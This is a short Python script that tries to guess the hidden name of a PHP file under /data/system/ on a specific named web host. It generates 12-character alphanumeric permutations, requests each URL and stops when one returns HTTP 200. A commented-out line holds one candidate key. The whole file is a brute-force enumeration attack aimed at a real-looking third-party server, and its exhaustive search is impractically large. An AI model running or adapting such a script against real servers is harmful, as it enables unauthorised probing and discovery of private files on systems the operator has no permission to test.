import string
import requests
from itertools  import permutations

def test(key):
    url=f"{host}/data/system/{key}.php"
    r =requests.get(url)
    assert r.status_code in [200,404]
    return r.status_code == 200

def main():
    possibles = string.ascii_uppercase +string.ascii_lowercase + string.digits
    for c in permutations(possibles,12):
        key="".join(c)
        res=test(key)
        print(key,res)
        if res:
            exit()

if __name__ == '__main__':
    host = "http://netdisk.a.163.gs"
    # print(test("dMHy6wKDudIR"))
    main()